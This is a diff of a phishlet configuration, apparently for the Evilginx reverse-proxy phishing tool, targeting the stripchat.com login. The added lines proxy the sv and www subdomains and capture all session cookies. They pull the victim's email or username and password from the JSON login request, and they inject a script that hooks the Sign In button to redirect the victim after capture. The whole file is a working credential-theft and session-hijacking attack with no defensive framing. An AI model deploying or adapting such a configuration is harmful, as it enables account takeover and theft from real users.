@@ -1,29 +1,58 @@
 author: '@luffy'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true}
  
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.com', session: true, is_landing: false}
+  
+
 sub_filters:
-  - {triggers_on: 'sv.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'sv.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'sv.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'sv.stripchat.com', orig_sub: 'sv', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sv.stripchat.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.stripchat.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
+  - domain: 'sv.stripchat.com'
+    keys: ['.*,regexp']
   - domain: '.stripchat.com'
     keys: ['.*,regexp']
-auth_urls:
-  - '/login/.*'
 credentials:
   username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"loginOrEmail":"([^"]*)"'
+    type: 'json'
   password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'    
+    key: ''
+    search: '"password":"([^"]*)"'
+    type: 'json'
 login:
   domain: 'sv.stripchat.com'
   path: '/login'
-    
+# Handle redirect issue, only login page will have three buttons.
+# Hook Sign In button to redirect after they click it, keep checking for
+# buttons every second
+js_inject:
+  - trigger_domains: ["sv.stripchat.com"]
+    trigger_paths: ["/login"]
+    script: |
+      async function worker() {
+        const elements = document.getElementsByTagName("BUTTON");
+        const num = elements.length;
+        if (num < 3) {
+          return;
+        } else {
+          document.getElementsByTagName("BUTTON")[0].onclick = redirectme;
+        }
+      }
+      function sleeptime(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+      async function redirectme() {
+        await sleeptime(2000);
+        window.location.href = "{redirect_url}";
+      }
+      function myFunction() {
+        var run = setInterval("worker()", 1000); 
+      }
+      myFunction();
